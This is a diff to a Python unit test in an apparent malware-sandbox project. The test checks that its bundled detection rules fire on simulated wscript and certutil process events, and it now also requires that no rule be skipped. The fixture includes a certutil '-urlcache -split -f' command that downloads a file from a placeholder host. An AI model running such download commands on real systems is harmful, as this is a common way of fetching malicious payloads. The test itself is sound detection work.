@@ -129,7 +129,7 @@ class ArchivesAndTelemetry(unittest.TestCase):
     def test_real_rules_detect_script_host_and_certutil(self):
         rules, skipped = load_rules(str(PROJECT_ROOT / "backend/sandbox/rules"))
         self.assertGreater(len(rules), 0)
-        self.assertGreater(len(skipped), 0)
+        self.assertEqual(skipped, {}, "every bundled rule must be one the engine can evaluate")
         xml = ("<Events>" + process_event("root", "outside", r"wscript C:\sandbox\in\sample_marker.js", r"C:\Windows\System32\wscript.exe")
                + process_event("child", "root", "certutil.exe -urlcache -split -f http://example.invalid/demo.txt C:\\demo.txt", r"C:\Windows\System32\certutil.exe") + "</Events>")
         hits = evaluate(rules, sample_tree_events(xml, "sample_marker"))
